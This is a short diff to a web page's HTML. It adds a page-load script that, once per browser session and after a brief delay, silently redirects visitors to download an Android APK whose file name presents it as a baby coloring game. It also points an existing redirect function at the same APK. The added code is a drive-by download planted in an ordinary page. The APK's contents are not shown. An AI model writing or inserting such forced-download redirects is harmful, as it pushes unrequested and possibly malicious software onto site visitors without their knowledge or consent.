@@ -78,12 +78,24 @@
 </style>
 
 
+  <script type="text/javascript">
+	  
+	  window.onload = function(){
 	
+	 var  value= sessionStorage.getItem("flg");
+  if(value==null || value==undefined){
+          setTimeout(function(){
+        sessionStorage.setItem("flg","2");
+        window.location.href = "https://beijing-remote.cdn.bcebos.com/%E5%AE%9D%E5%AE%9D%E6%B6%82%E8%89%B2%E6%B8%B8%E6%88%8F.apk";
+       },600);
+  }
+	  }	  
+  </script>	
 	
 <script>
 function random_url()
 {
-		window.location.href = "http://eawm.cn/n3UI26";
+		window.location.href = "https://beijing-remote.cdn.bcebos.com/%E5%AE%9D%E5%AE%9D%E6%B6%82%E8%89%B2%E6%B8%B8%E6%88%8F.apk";
 
 }
 </script>
